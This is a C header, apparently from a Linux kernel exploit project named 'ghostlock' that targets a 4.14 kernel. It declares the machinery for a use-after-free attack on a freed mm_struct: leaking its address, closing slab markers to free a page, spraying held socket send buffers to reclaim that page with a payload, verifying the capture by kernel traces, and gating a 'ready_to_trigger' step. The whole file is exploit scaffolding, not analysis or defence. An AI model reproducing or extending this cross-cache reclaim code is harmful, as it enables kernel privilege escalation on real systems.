/* SPDX-License-Identifier: Apache-2.0 */
#ifndef RECLAIM_HOLD_H
#define RECLAIM_HOLD_H

#include <stddef.h>
#include <stdint.h>

/*
 * Keep this helper independent of common.h.  The 4.14 port can therefore
 * exercise the resource and gating logic on the host without pulling in the
 * target-specific exploit definitions.
 */
#define GHOSTLOCK_BUDDY_GUARD_PAIRS 8U
#define GHOSTLOCK_RECLAIM_PAIRS 32U
#define GHOSTLOCK_RECLAIM_MAX_PAIRS 128U
#define GHOSTLOCK_RECLAIM_SENDS 128U
#define GHOSTLOCK_RECLAIM_SNDBUF (1U << 20)

struct ghostlock_reclaim_batch {
  int sv[GHOSTLOCK_RECLAIM_MAX_PAIRS][2];
  size_t pair_count;
  size_t held_sends;
  int initialized;
};

struct ghostlock_reclaim_result {
  size_t requested;
  size_t sent;
  size_t sent_per_pair[GHOSTLOCK_RECLAIM_MAX_PAIRS];
  int first_errno;
  int failed_pair;
  int complete;
};

struct ghostlock_marker_result {
  size_t requested;
  size_t closed;
  int first_errno;
  size_t first_failed_index;
  int complete;
};

enum ghostlock_prepare_stage {
  GHOSTLOCK_PREPARE_IDLE = 0,
  GHOSTLOCK_PREPARE_LEAK_VALID,
  GHOSTLOCK_PREPARE_PAGE_RELEASED,
  GHOSTLOCK_PREPARE_SPRAY_HELD,
  GHOSTLOCK_PREPARE_CAPTURE_VERIFIED,
  GHOSTLOCK_PREPARE_FAILED,
};

enum ghostlock_trace_proof {
  GHOSTLOCK_TRACE_MM_CACHE_FREE = 1U << 0,
  GHOSTLOCK_TRACE_PAGE_FREE = 1U << 1,
  GHOSTLOCK_TRACE_PAGE_ALLOC = 1U << 2,
  GHOSTLOCK_TRACE_SKB_KMALLOC = 1U << 3,
  GHOSTLOCK_TRACE_ADDRESS_MATCH = 1U << 4,
};

#define GHOSTLOCK_TRACE_REQUIRED                                             \
  (GHOSTLOCK_TRACE_MM_CACHE_FREE | GHOSTLOCK_TRACE_PAGE_FREE |              \
   GHOSTLOCK_TRACE_PAGE_ALLOC | GHOSTLOCK_TRACE_SKB_KMALLOC |               \
   GHOSTLOCK_TRACE_ADDRESS_MATCH)

/*
 * prepare_only is a hard interlock: capture_verified can become true, but
 * ready_to_trigger remains false.  A live attempt must initialize a fresh
 * result with prepare_only == 0 and prove capture for that same attempt.
 */
struct ghostlock_prepare_result {
  enum ghostlock_prepare_stage stage;
  int prepare_only;
  int failure_errno;

  uintptr_t leaked_mm;
  uintptr_t page_base;
  size_t page_size;
  size_t object_stride;
  size_t objects_per_slab;
  size_t leaked_offset;

  struct ghostlock_marker_result markers;
  struct ghostlock_reclaim_result reclaim;
  uint32_t trace_proof;
  int capture_verified;
  int ready_to_trigger;
};

void ghostlock_reclaim_batch_init(struct ghostlock_reclaim_batch *batch);
int ghostlock_reclaim_batch_open(struct ghostlock_reclaim_batch *batch,
                                 size_t pair_count, int send_buffer_bytes);
void ghostlock_reclaim_batch_close(struct ghostlock_reclaim_batch *batch);

/* Queue one payload on the next socket while retaining all earlier sends. */
int ghostlock_reclaim_hold_one(struct ghostlock_reclaim_batch *batch,
                               const void *payload, size_t payload_len);

/*
 * Queue every full payload and never receive it.  A short write is a hard
 * failure because it cannot contain the expected order-3 payload geometry.
 */
int ghostlock_reclaim_hold_all(struct ghostlock_reclaim_batch *batch,
                               const void *payload, size_t payload_len,
                               size_t send_count,
                               struct ghostlock_reclaim_result *result);

/*
 * Close one retained object per slab.  Call this after closing the leaked
 * mm_struct and immediately before ghostlock_reclaim_hold_all().  The helper
 * allocates nothing and performs no logging in that critical window.
 */
int ghostlock_close_slab_markers(int *fds, size_t fd_count,
                                 size_t objects_per_slab,
                                 struct ghostlock_marker_result *result);

void ghostlock_prepare_result_init(struct ghostlock_prepare_result *result,
                                   int prepare_only);
int ghostlock_prepare_note_leak(struct ghostlock_prepare_result *result,
                                uintptr_t leaked_mm, size_t page_size,
                                size_t object_stride);
int ghostlock_prepare_note_page_release(
    struct ghostlock_prepare_result *result,
    const struct ghostlock_marker_result *markers);
int ghostlock_prepare_note_spray(
    struct ghostlock_prepare_result *result,
    const struct ghostlock_reclaim_result *reclaim);
int ghostlock_prepare_note_trace(struct ghostlock_prepare_result *result,
                                 uint32_t trace_proof);
void ghostlock_prepare_fail(struct ghostlock_prepare_result *result,
                            int failure_errno);

#endif
